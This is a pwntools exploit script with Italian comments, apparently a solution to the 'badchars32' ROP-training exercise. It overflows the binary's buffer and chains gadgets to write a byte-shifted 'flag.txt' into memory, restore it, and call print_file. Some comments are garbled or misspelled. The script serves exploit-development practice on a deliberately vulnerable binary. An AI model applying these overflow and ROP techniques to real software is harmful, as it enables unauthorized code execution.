from pwn import *

elf = ELF("./badchars32")
p = process("./badchars32")

'''
   Come per l'esercizio precedente, in badchars bisogna scrivere "flag.txt" in una sezione scrivibile del file,
   dove però i caratteri AAAA verranno sovrascritti con AAAA. 
   Per risolvere ciò andremo a scrivere in memoria flag.txt shiftata di due caratteri indietro (così da evitare tutti i badchars)
   e poi utilizzeremo il gadget add_ebp_bl per ripristinare la stringa originale 
'''

mov_edi_esi = p32(0x0804854f)
pop_esi_edi_ebp = p32(0x080485b9)
writable_area = 0x0804a018
pop_ebx = p32(0x0804839d) # pop ebx per ricavare bl, pop ebp per ricavare [ebp], gadget add
add_ebp_bl = p32(0x08048543) 
pop_ebp = p32(0x080485bb)


# scrittura nella writable area dei caratteri di flax.txt shiftati di 2 posizioni indietro per evitare i badchars
payload = b''
payload += pop_esi_edi_ebp + b'dj_e' + p32(writable_area) + p32(0) + mov_edi_esi 
payload += pop_esi_edi_ebp + b',rvr' + p32(writable_area + 4) + p32(0) + mov_edi_esi 

# per ogni lettera (byte su bl) sommo 2 al valore per ripristinare flax.txt
for i in range(8):
	payload += pop_ebp + p32(writable_area + i)
	payload += pop_ebx + p32(2) + add_ebp_bl
payload += p32(elf.symbols['print_file']) + p32(0) + p32(writable_area)



p.recvuntil('> ')
p.send(cyclic(44) + payload)					  
p.interactive()
